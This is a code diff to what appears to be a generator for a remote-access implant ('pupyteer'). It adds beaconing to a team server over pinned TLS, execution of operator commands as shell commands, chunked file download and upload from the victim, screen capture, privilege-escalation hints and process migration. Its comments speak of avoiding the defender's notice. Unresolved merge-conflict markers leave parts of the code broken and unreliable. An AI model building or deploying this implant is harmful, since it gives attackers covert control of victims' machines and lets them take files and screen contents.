@@ -74,10 +74,15 @@ class StubConfig:
     sleep: int = 60                    # seconds
     jitter: int = 20                   # percent (0-100)
 
-    # Feature toggles
-    persistence: bool = True
+    # One command's reply is clipped to this many characters, so a `find /` on
+    # the target cannot outgrow the listener's per-message ceiling.
+    max_output: int = 262144
+
+    # Feature toggles — off by default: a lab run of a fresh payload must not
+    # write registry/crontab entries or open a relay listener unasked.
+    persistence: bool = False
     migration: bool = True
-    relay: bool = True                 # Named-pipe / TCP P2P relay
+    relay: bool = False                # Named-pipe / TCP P2P relay
     anti_analysis: bool = False        # VM / sandbox detection
     obfuscation: Optional[str] = None  # "none" | "light" | "medium" | "heavy" | path-to-module
 
@@ -88,7 +93,6 @@ class StubConfig:
         "fs": True,
         "privesc": True,
         "screenshot": False,
-        "keylog": False,
     })
 
     # Transport extras
@@ -97,6 +101,21 @@ class StubConfig:
     dns_key: str = ""                  # XOR key for DNS payload encoding
     http_uri: str = "/index.html"      # fronting URI
     http_method: str = "POST"
+
+    # Callbacks over TLS, trusted by pinning the listener's own certificate
+    # rather than by whatever CAs the target happens to trust: a team server is
+    # usually reached by IP with a self-signed certificate, and "verify against
+    # the system store" would reject it while "verify nothing" would be a
+    # man-in-the-middle with extra steps.
+    tls: bool = False
+    tls_cert_pem: str = ""
+
+    # Enrollment secret, presented when registering. TLS proves the listener to
+    # the agent; this proves the agent to the listener, so reaching the port is
+    # not by itself enough to be handed a session. Read it as a claim about who
+    # *built* the payload rather than who holds it: the string sits in the
+    # script, so anyone who recovers a dropped binary has it too.
+    auth_secret: str = ""
 
     # Relay
     relay_pipe: str = "pupypeer"       # pipe name (win) / unix-socket name (posix)
@@ -108,9 +127,10 @@ class StubConfig:
     migrate_target: str = ""           # PID or process name
     migrate_technique: str = "auto"    # auto | reflective | procwrite | fork
 
-    # C2 crypto
-    aes_key: str = ""                  # 32-char (16-byte hex shared secret)
-    use_encryption: bool = True
+    # String-obfuscation key. Not a cipher key: the built-in obfuscator XORs a
+    # string table with it. The session channel is encrypted by TLS alone —
+    # see "What does not work yet" in the README.
+    obfuscation_key: str = ""
 
     # Build
     compiler: str = "pyinstaller"      # pyinstaller | nuitka | script
@@ -183,6 +203,14 @@ class AgentStubGenerator:
 
     # -- compiler wrappers ---------------------------------------------------
 
+    def artifact_stem(self, config: StubConfig) -> str:
+        """Bare name the compiler writes, without any extension.
+
+        Exposed because `--name` is a slug of the operator's label, and a caller
+        collecting the build output has to look for the same spelling.
+        """
+        return _slug(config.name)
+
     def pyinstaller_stub(self, config: StubConfig) -> str:
         """Return a PyInstaller .spec-like one-file launcher."""
         # Import the agent module; the .py file is written separately.
@@ -252,10 +280,8 @@ class AgentStubGenerator:
             "include_fs": cfg.modules.get("fs", False),
             "include_privesc": cfg.modules.get("privesc", False),
             "include_screenshot": cfg.modules.get("screenshot", False),
-            "include_keylog": cfg.modules.get("keylog", False),
             "platform": cfg.platform.lower(),
             "transport": cfg.transport.lower(),
-            "enc": cfg.use_encryption,
             "obf": cfg.obfuscation or "none",
             "persistence": cfg.persistence,
             "migration": cfg.migration,
@@ -357,6 +383,7 @@ def _xor(key: bytes, data: bytes) -> bytes:
 def _sha256(b):
     return _hl.sha256(_enc(b)).hexdigest()
 
+<<<<<<< HEAD
 
 def _scrub(*buffers) -> None:
     """Best-effort overwrite of sensitive bytes buffers.
@@ -448,12 +475,19 @@ def _decrypt_payload(envelope: bytes) -> bytes:
     except Exception as e:
         _log(f"payload decryption failed ({e})", "debug")
         return b""
+=======
+_LOG_LEVELS = {"debug": _lg.DEBUG, "info": _lg.INFO,
+               "warning": _lg.WARNING, "error": _lg.ERROR}
+>>>>>>> origin/nextgen
 
 def _log(msg, level="info"):
     if level == "debug" and not dbg:
         return
     try:
-        _lg.info("[pupyteer] %s", msg)
+        # Honour the level: with no handler configured, logging only emits
+        # WARNING and above, so an "error" sent through info() is dropped and a
+        # failed build or bind is invisible on the target.
+        _lg.log(_LOG_LEVELS.get(level, _lg.INFO), "[pupyteer] %s", msg)
     except Exception:
         pass
 
@@ -469,6 +503,7 @@ def _log(msg, level="info"):
 # source *reads*; the runtime behaviour — including the TCP listener
 # handshake — is byte-for-byte identical to the plaintext build.
 
+<<<<<<< HEAD
 {% set _obf_key = cfg.aes_key or rnd_str(32) %}
 {% set _obf_key2 = rnd_str(32) %}
 
@@ -490,6 +525,11 @@ class _Obfuscator:
         self._aliases: dict = {}
 
     # -- string table --------------------------------------------------
+=======
+    def __init__(self, key: str = "{{ cfg.obfuscation_key or rnd_str(32) }}"):
+        self._key = _enc(key or _sg.printable[:16])
+        self._table: list[bytes] = []
+>>>>>>> origin/nextgen
 
     def store(self, literal: str) -> str:
         """Encrypt a literal; return the runtime retriever expression."""
@@ -1098,42 +1138,94 @@ def identity():
 class TransportError(Exception):
     pass
 
+TLS_ON = {{ cfg.tls }}
+TLS_CERT_PEM = {{ cfg.tls_cert_pem | tojson }}
+AUTH_SECRET = {{ cfg.auth_secret | tojson }}
+
+def pinned_tls_context():
+    """A client context that trusts exactly one certificate: the listener's.
+
+    Hostname checking is off because the team server is normally addressed by
+    IP, and its self-signed certificate has no matching name. Signature
+    verification stays on, so anything but the pinned certificate is rejected.
+    """
+    if not TLS_CERT_PEM:
+        raise TransportError("TLS is enabled but no listener certificate was compiled in")
+    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_REQUIRED
+    ctx.load_verify_locations(cadata=TLS_CERT_PEM)
+    return ctx
+
 class BaseTransport:
     name = "base"
 
     def send(self, data: bytes) -> bytes:
         raise NotImplementedError
 
+    def request(self, msg: dict) -> dict:
+        """One JSON message in, one JSON reply out."""
+        raw = self.send(_j.dumps(msg).encode())
+        if not raw:
+            return {}
+        return _j.loads(raw.decode("utf-8", "replace").strip())
+
     def close(self):
         pass
 
 class TCPTransport(BaseTransport):
+    """Newline-delimited JSON over a single long-lived connection.
+
+    The listener reads with readline(), so one request per socket would mean
+    registering again for every beacon and leaving another session behind each
+    time. What makes a beacon ours is the token registration handed back, not this
+    socket — keeping the connection is about not multiplying sessions, not about
+    being recognised.
+    """
     name = "tcp"
 
     def __init__(self, host: str, port: int, timeout: int = 15):
         self._host = host
         self._port = port
         self._timeout = timeout
+        self._sock = None
 
-    def send(self, data: bytes) -> bytes:
-        with _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM) as s:
+    def _connect(self):
+        if self._sock is None:
+            s = _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM)
             s.settimeout(self._timeout)
             s.connect((self._host, self._port))
-            s.sendall(_st.pack(">I", len(data)) + data)
-            hdr = b""
-            while len(hdr) < 4:
-                chunk = s.recv(4 - len(hdr))
-                if not chunk:
-                    raise TransportError("connection closed")
-                hdr += chunk
-            n = _st.unpack(">I", hdr)[0]
-            buf = b""
-            while len(buf) < n:
-                chunk = s.recv(min(4096, n - len(buf)))
-                if not chunk:
-                    raise TransportError("connection closed")
-                buf += chunk
-            return buf
+            if TLS_ON:
+                s = pinned_tls_context().wrap_socket(
+                    s, server_hostname=self._host)
+            self._sock = s
+        return self._sock
+
+    def _read_line(self, s) -> bytes:
+        buf = b""
+        while not buf.endswith(b"\n"):
+            chunk = s.recv(4096)
+            if not chunk:
+                raise TransportError("connection closed")
+            buf += chunk
+        return buf
+
+    def send(self, data: bytes) -> bytes:
+        s = self._connect()
+        try:
+            s.sendall(data + b"\n")
+            return self._read_line(s)
+        except Exception:
+            self.close()
+            raise
+
+    def close(self):
+        if self._sock is not None:
+            try:
+                self._sock.close()
+            except Exception:
+                pass
+            self._sock = None
 
 class HTTPTransport(BaseTransport):
     name = "http"
@@ -1142,7 +1234,10 @@ class HTTPTransport(BaseTransport):
                  uri: str = "{{ cfg.http_uri }}",
                  ua: str = "{{ cfg.user_agent }}",
                  method: str = "{{ cfg.http_method }}"):
-        self._base = f"http{'s' if tls else ''}://{host}:{port}"
+        self._host = host
+        self._port = port
+        self._tls = tls or TLS_ON
+        self._base = f"http{'s' if self._tls else ''}://{host}:{port}"
         self._uri = uri
         self._ua = ua
         self._method = method
@@ -1167,7 +1262,8 @@ class HTTPTransport(BaseTransport):
                 headers=headers,
                 method=self._method,
             )
-            with urllib.request.urlopen(req, timeout=15) as resp:
+            context = pinned_tls_context() if self._tls else None
+            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                 raw = resp.read()
                 try:
                     return _decrypt_payload(_b64d(raw))
@@ -1360,8 +1456,14 @@ def mod_processes():
 {% if include_exec %}
 def mod_exec(command: str, timeout: int = 60) -> dict:
     try:
-        shell = PLATFORM == "windows"
-        p = _sp.run(command, capture_output=True, text=True,
+        if PLATFORM == "windows":
+            argv, shell = command, True
+        else:
+            # With shell=False subprocess treats a plain string as an executable
+            # path and no arguments, so "id -u" would fail; split it instead of
+            # routing every command through a shell.
+            argv, shell = _sh.split(command), False
+        p = _sp.run(argv, capture_output=True, text=True,
                     timeout=timeout, shell=shell)
         return {
             "stdout": p.stdout,
@@ -1375,7 +1477,12 @@ def mod_exec(command: str, timeout: int = 60) -> dict:
 {% endif %}
 
 {% if include_fs %}
-def mod_fs_list(path: str = ".") -> list:
+def mod_fs_list(path: str = ".") -> dict:
+    """One directory, as an object: a listing and a failure must not share a shape.
+
+    An empty directory is a real answer, and a server that has to guess which of
+    the two it got will guess wrong in its own favour.
+    """
     try:
         entries = []
         for e in _o.scandir(path):
@@ -1390,25 +1497,39 @@ def mod_fs_list(path: str = ".") -> list:
                 })
             except OSError:
                 pass
-        return entries
+        return {"path": path, "entries": entries}
     except Exception as e:
-        return [{"error": str(e)}]
+        return {"error": str(e)}
 
-def mod_fs_get(remote_path: str) -> bytes:
-    try:
-        with open(remote_path, "rb") as f:
-            return f.read()
-    except Exception as e:
-        return _enc(str(e))
+def mod_fs_get(remote_path: str, offset: int = 0, length: int = 0) -> bytes:
+    """Read up to *length* bytes from *offset*; length 0 means the whole rest.
 
-def mod_fs_put(remote_path: str, data: bytes) -> dict:
+    Raises rather than returning text: a caller cannot tell an unreadable file
+    apart from a file whose contents happen to look like an error.
+    """
+    with open(remote_path, "rb") as f:
+        if offset:
+            f.seek(offset)
+        return f.read(length) if length else f.read()
+
+def mod_fs_size(path: str) -> int:
+    return _o.path.getsize(path)
+
+def mod_fs_put(remote_path: str, data: bytes, offset: int = 0) -> dict:
+    """Write *data* at *offset*, creating parents — offsets let a large upload
+    arrive as a sequence of small messages instead of one giant one."""
     try:
         d = _o.path.dirname(remote_path)
         if d:
             _o.makedirs(d, exist_ok=True)
-        with open(remote_path, "wb") as f:
-            f.write(data)
-        return {"ok": True, "path": remote_path}
+        if offset:
+            with open(remote_path, "r+b") as f:
+                f.seek(offset)
+                f.write(data)
+        else:
+            with open(remote_path, "wb") as f:
+                f.write(data)
+        return {"ok": True, "path": remote_path, "offset": offset, "written": len(data)}
     except Exception as e:
         return {"ok": False, "error": str(e)}
 {% endif %}
@@ -1489,6 +1610,91 @@ def mod_privesc_suggest(check: dict) -> list:
         for svc in check.get("unquoted_services", []):
             suggestions.append(f"unquoted service path: {svc}")
     return suggestions
+{% endif %}
+
+{% if include_screenshot %}
+_MAX_SHOT_BYTES = 12 * 1024 * 1024
+
+def _ps_quote(value: str) -> str:
+    """Render a string as a PowerShell single-quoted literal ('' is its escape)."""
+    return "'" + value.replace("'", "''") + "'"
+
+
+def _shot_windows(path: str) -> None:
+    # System.Drawing writes a real PNG, so the agent needs no imaging library.
+    # The destination goes in as a single-quoted literal, not a trailing
+    # argument: `powershell -Command <script> <arg>` concatenates the argument
+    # onto the script text instead of binding it to $args.
+    script = (
+        "Add-Type -AssemblyName System.Windows.Forms;"
+        "Add-Type -AssemblyName System.Drawing;"
+        "$b = [System.Windows.Forms.SystemInformation]::VirtualScreen;"
+        "$i = New-Object System.Drawing.Bitmap $b.Width, $b.Height;"
+        "$g = [System.Drawing.Graphics]::FromImage($i);"
+        "$g.CopyFromScreen($b.Location, (New-Object System.Drawing.Point 0,0), $b.Size);"
+        "$i.Save(" + _ps_quote(path) + "); $g.Dispose(); $i.Dispose()"
+    )
+    _sp.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", script],
+            capture_output=True, timeout=60, check=True)
+
+
+def _shot_posix(path: str) -> None:
+    """Try each screen-grab this desktop might have installed, in likelihood order.
+
+    X11 and Wayland tools differ, and none of them is present on a headless
+    box — so every miss is remembered and reported rather than the last one.
+    """
+    if PLATFORM == "macos":
+        candidates = [["screencapture", "-x", path]]
+    else:
+        candidates = [
+            ["gnome-screenshot", "-f", path],
+            ["scrot", "--overwrite", path],
+            ["spectacle", "-b", "-n", path],
+            ["xfce4-screenshooter", "-f", "save", path],
+            ["import", "-window", "root", path],
+            ["grim", path],
+        ]
+    missing = []
+    for cmd in candidates:
+        try:
+            _sp.run(cmd, capture_output=True, timeout=60, check=True)
+            return
+        except FileNotFoundError:
+            missing.append(cmd[0])
+        except _sp.CalledProcessError:
+            missing.append(cmd[0] + " failed")
+    raise RuntimeError("no working screenshot tool (tried: " + ", ".join(missing) + ")")
+
+
+def mod_screenshot() -> dict:
+    """Capture the whole screen and return it base64-encoded.
+
+    Returned inline rather than written where the operator can fetch it: a
+    capture left on disk is a file the defender will find later.
+    """
+    import tempfile as _tf
+    fd, path = _tf.mkstemp(prefix=".pupyteer-shot-", suffix=".png")
+    _o.close(fd)
+    try:
+        if PLATFORM == "windows":
+            _shot_windows(path)
+        else:
+            _shot_posix(path)
+        with open(path, "rb") as f:
+            raw = f.read()
+    finally:
+        try:
+            _o.remove(path)
+        except OSError:
+            pass
+    if not raw:
+        return {"error": "capture produced an empty image"}
+    if len(raw) > _MAX_SHOT_BYTES:
+        # Handing back more than this would push the reply past the listener's
+        # message ceiling and drop the connection with every queued command.
+        return {"error": f"image too large to return: {len(raw)} bytes"}
+    return {"format": "png", "bytes": len(raw), "data": _b64e(raw).decode()}
 {% endif %}
 
 # --------------------------------------------------------------------- #
@@ -1772,10 +1978,26 @@ def _dispatch(task: dict) -> dict:
     if action == "fs_list":
         return mod_fs_list(task.get("path", "."))
     if action == "fs_get":
-        return {"data": _b64e(mod_fs_get(task.get("path", ""))).decode()}
+        # Chunked on purpose: a whole file in one reply would be a JSON string
+        # of its base64 size, held in memory on both ends.
+        path = task.get("path", "")
+        offset = int(task.get("offset") or 0)
+        length = int(task.get("length") or 0)
+        try:
+            size = mod_fs_size(path)
+            data = mod_fs_get(path, offset, length)
+        except OSError as e:
+            return {"error": str(e)}
+        return {
+            "size": size,
+            "offset": offset,
+            "length": len(data),
+            "eof": size >= 0 and offset + len(data) >= size,
+            "data": _b64e(data).decode(),
+        }
     if action == "fs_put":
         raw = _b64d(task.get("data", ""))
-        return mod_fs_put(task.get("path", ""), raw)
+        return mod_fs_put(task.get("path", ""), raw, int(task.get("offset") or 0))
     {% endif %}
     {% if include_privesc %}
     if action == "privesc_check":
@@ -1783,6 +2005,10 @@ def _dispatch(task: dict) -> dict:
     if action == "privesc_suggest":
         check = mod_privesc_check()
         return {"check": check, "suggestions": mod_privesc_suggest(check)}
+    {% endif %}
+    {% if include_screenshot %}
+    if action == "screenshot":
+        return mod_screenshot()
     {% endif %}
     {% if migration %}
     if action == "migrate":
@@ -1795,24 +2021,187 @@ def _dispatch(task: dict) -> dict:
 {% endif %}
 
 def _c2_roundtrip(transport) -> bool:
-    """Send a check-in beacon and dispatch any tasks returned."""
+    """Register, then beacon on that session until the link breaks."""
+    session_id, beacon = _register(transport)
+    _log(f"registered as session {session_id}")
+    _run_session(transport, session_id, beacon)
+    return True
+
+def _register(transport) -> tuple:
+    """Register and return (session_id, beacon_token)."""
+    ident = identity()
+    resp = transport.request({
+        "type": "register",
+        "auth": AUTH_SECRET,
+        "hostname": ident["hostname"],
+        "os": ident["os"],
+        "arch": ident["arch"],
+        "username": ident["user"],
+        "agent_version": ident["version"],
+        # What this build was compiled with, written out of the same switches that
+        # decided which handlers exist above. The server queues a tasking to an
+        # implant that cannot perform it and gets whatever a shell says about the
+        # word instead; this list is how it knows not to. It is a claim about this
+        # file, not about what the operator is allowed to ask.
+        "capabilities": [
+            {% if include_exec %}"exec",{% endif %}
+            "ping", "shutdown",
+            {% if include_recon %}"sysinfo", "network", "processes",{% endif %}
+
+            {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
+            {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
+            {% if include_screenshot %}"screenshot",{% endif %}
+            {% if migration %}"migrate",{% endif %}
+        ],
+        # No fixed read buffer: a line here is as long as memory allows, and this
+        # is the number a chunked transfer is sized against. It is generous on
+        # purpose, because the transfer module caps at far less anyway.
+        "max_line": 4 * 1024 * 1024,
+    })
+    if resp.get("type") == "error" and resp.get("message") == "auth_failed":
+        # The listener is there and answered; it just does not know this agent.
+        # Retrying cannot change that — the secret was fixed at build time — and
+        # beaconing against a server that will never accept you is the loudest
+        # possible footprint. Say it once and stop.
+        _log("listener rejected our enrollment secret; rebuild this payload "
+             "from the team server that owns the listener", "error")
+        raise SystemExit(3)
+    if resp.get("type") != "registered" or not resp.get("session_id"):
+        raise TransportError(f"register refused: {resp!r}")
+    # The token is what makes the next messages ours rather than merely addressed
+    # to us. A server that withholds it is one we cannot beacon against, so treat
+    # its absence as a failed registration rather than starting a session that the
+    # listener will refuse every turn around.
+    beacon = resp.get("beacon_token", "")
+    if not beacon:
+        raise TransportError("registered without a beacon token")
+    return resp["session_id"], beacon
+
+def _run_session(transport, session_id: str, beacon: str) -> None:
+    """Check in, run what the server queues, report back, repeat.
+
+    Returns only when the connection fails; main() then re-registers. The beacon
+    token from registration travels on both message types, because a session id
+    only names a session and anyone reading operator output can get one.
+    """
+    base_sleep = {{ cfg.sleep }}
+    jitter_pct = {{ cfg.jitter }}
+    while True:
+        resp = transport.request({
+            "type": "checkin",
+            "session_id": session_id,
+            "beacon": beacon,
+        })
+        if resp.get("type") == "error":
+            raise TransportError(f"checkin refused: {resp.get('message')}")
+        for task in resp.get("commands", []):
+            result = _run_command(task.get("command", ""))
+            transport.request({
+                "type": "output",
+                "session_id": session_id,
+                "command_id": task.get("command_id", ""),
+                "output": result,
+                "beacon": beacon,
+            })
+        _jittered_sleep(base_sleep, jitter_pct)
+
+def _run_command(text: str) -> str:
+    """Run one line of operator input and return output as text.
+
+    Anything that is not a named module action is executed as a shell command,
+    which is what an operator typing into `sessions interact` expects.
+    """
+    text = (text or "").strip()
+    if not text:
+        return ""
+    task = _parse_command(text)
     try:
-        transport = transport or make_transport()
-        checkin = _j.dumps({"agent": identity(), "data": None}).encode()
-        raw = transport.send(checkin)
-        if not raw:
-            return False
-        tasks = _j.loads(raw)
-        if isinstance(tasks, dict):
-            tasks = [tasks]
-        for task in tasks:
-            result = _dispatch(task)
-            followup = _j.dumps({"agent": identity(), "result": result}).encode()
-            transport.send(followup)
-        return True
+        result = _dispatch(task)
+    except SystemExit:
+        raise
     except Exception as e:
-        _log(f"beacon error: {e}", "debug")
-        return False
+        return f"error: {e}"
+    if task.get("action") in ("fs_get", "fs_put", "screenshot"):
+        # Binary replies carry base64 that the operator parses whole; clipping
+        # it mid-stream yields corrupt data. They bound themselves instead.
+        return _render_result(result)
+    return _clip(_render_result(result))
+
+
+def _render_result(result) -> str:
+    if isinstance(result, dict) and "stdout" in result:
+        out = result.get("stdout") or ""
+        err = result.get("stderr") or ""
+        rc = result.get("returncode")
+        if err:
+            out += err if out else ""
+        if rc:
+            out += f"\n[exit {rc}]"
+        return out.strip() or f"[no output, exit {rc}]"
+    if isinstance(result, str):
+        return result
+    try:
+        return _j.dumps(result, default=str)
+    except Exception:
+        return str(result)
+
+
+def _clip(text: str) -> str:
+    """Keep one command from outgrowing the listener's message ceiling.
+
+    A line over MAX_MESSAGE_BYTES kills the connection mid-transfer, taking
+    every other session command down with it.
+    """
+    limit = {{ cfg.max_output }}
+    if len(text) <= limit:
+        return text
+    return text[:limit] + f"\n[output truncated at {limit} chars]"
+
+
+def _parse_command(text: str) -> dict:
+    # A line that is already a JSON task bypasses the vocabulary: file transfer
+    # needs arguments (offset, base64 data) that do not survive being typed.
+    if text.startswith("{"):
+        try:
+            task = _j.loads(text)
+        except ValueError:
+            return {"action": "exec", "command": text}
+        if isinstance(task, dict) and task.get("action"):
+            return task
+        return {"action": "exec", "command": text}
+    verb, _, rest = text.partition(" ")
+    v, arg = verb.lower(), text[len(verb):].strip()
+    if v in ("sysinfo", "network", "privesc_check", "privesc_suggest", "ping"):
+        return {"action": v}
+    if v in ("ps", "processes"):
+        # Both words answer the server's capability by that name. A word the
+        # queue will let through and this table does not know is a word that
+        # reaches the shell, and the shell's complaint about it reads as the
+        # target's answer.
+        return {"action": "processes"}
+    if v in ("exit", "shutdown"):
+        return {"action": "shutdown"}
+    if v == "fs_list":
+        return {"action": "fs_list", "path": arg or "."}
+    if v == "fs_get":
+        parts = _sh.split(arg) if arg else []
+        return {"action": "fs_get", "path": parts[0] if parts else "",
+                "offset": int(parts[1]) if len(parts) > 1 else 0,
+                "length": int(parts[2]) if len(parts) > 2 else 0}
+    if v == "fs_put":
+        # fs_put "<path>" <offset> <base64>
+        parts = _sh.split(arg) if arg else []
+        data = parts[-1] if parts else ""
+        return {"action": "fs_put", "path": parts[0] if parts else "",
+                "offset": int(parts[1]) if len(parts) > 2 else 0,
+                "data": data}
+    if v == "migrate":
+        return {"action": "migrate", "target": arg}
+    {% if include_screenshot %}
+    if v == "screenshot":
+        return {"action": "screenshot"}
+    {% endif %}
+    return {"action": "exec", "command": text}
 
 # --------------------------------------------------------------------- #
 #  Signed listener client (matches server AgentListener protocol)
@@ -1956,6 +2345,12 @@ def _listener_loop() -> None:
 
 def main():
     _log(f"starting agent {AGENT_ID} on {PLATFORM}/{ARCH}")
+    if TLS_ON and not TLS_CERT_PEM:
+        # Not a transient failure to wait out: without a certificate to trust the
+        # agent can never reach its listener, and a silent retry loop hides the
+        # build mistake that caused it.
+        _log("TLS enabled with no listener certificate compiled in; exiting", "error")
+        raise SystemExit(2)
     {% if persistence %}
     try:
         install_persistence()
@@ -1968,6 +2363,7 @@ def main():
     except Exception as e:
         _log(f"relay error: {e}", "debug")
     {% endif %}
+<<<<<<< HEAD
     base_sleep = {{ cfg.sleep }}
     jitter_pct = {{ cfg.jitter }}
     transport_name = "{{ transport }}"
@@ -1980,18 +2376,21 @@ def main():
             _log("interrupted", "debug")
         return
     transport = make_transport()
+=======
+    failures = 0
+>>>>>>> origin/nextgen
     while True:
+        transport = make_transport()
         try:
             _c2_roundtrip(transport)
+            failures = 0
         except Exception as e:
-            _log(f"main loop: {e}", "debug")
-            # Reconnect with new transport
-            try:
-                transport.close()
-            except Exception:
-                pass
-            transport = make_transport()
-        _jittered_sleep(base_sleep, jitter_pct)
+            failures += 1
+            # The first failure is the one that answers "why is this beacon not
+            # coming home". After that keep quiet: repeating it is a footprint.
+            _log(f"link lost: {e}", "info" if failures == 1 else "debug")
+            transport.close()
+            _jittered_sleep({{ cfg.sleep }}, {{ cfg.jitter }})
 
 if __name__ == "__main__":
     # Support --child-migrated so forked children skip persistence + relay bootstrap.
